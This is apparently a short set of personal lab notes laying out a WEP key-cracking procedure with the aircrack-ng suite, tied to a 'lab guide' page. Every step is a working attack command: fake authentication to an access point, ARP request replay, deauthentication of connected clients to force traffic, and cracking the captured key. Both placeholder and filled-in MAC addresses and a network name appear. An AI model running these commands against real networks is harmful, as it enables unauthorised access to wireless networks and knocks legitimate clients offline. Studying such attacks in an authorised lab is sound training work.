# Is ENC WEP? yes
# Is CIPHER WEP? yes
# Is AUTH OPN/SKA? yes

# lab guide page 180

###############################################
# arp request replay attack w/ clients        #
###############################################

# STEP 1
# dump traffic on access points channel
# monitor for data
# monitor for attached clients
# monitor for fake auth attempt when executed
airodump-ng -c <ch> --bssid <ap_mac> -w <file_out> mon0

# STEP 2
# fake auth request/attack
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <MY_MAC> mon0
aireplay-ng -1 0 -e hostileNetwork2g -a 4C:60:DE:4A:62:80 -h 00:C0:CA:53:0A:D1 mon0

# STEP 3
# start with base attack
# once an arp request is captured it will get replicated by this command
aireplay-ng -3 -b <BSSID> -h <my_mac> mon0
aireplay-ng -3 -b 4C:60:DE:4A:62:80 -h 00:C0:CA:53:0A:D1 mon0

# STEP 4
# deauth attack
# use to speed up arp capture for arp replay attack
# 2 at a time works better than a lot of deauths
# deauth the client until there is an arp request that we can capture from step 3
aireplay -0 2 -a <BSSID> -c <CLIENT_MAC> mon0 
aireplay-ng -0 2 -a 4C:60:DE:4A:62:80  -c 8C:85:90:43:C5:E5 mon0
# STEP 5
# once #data hits 20k+
# mayneed to try multipl cap files depending on capture length
aircrack-ng <airodump_file>.cap

##################### END #####################
###############################################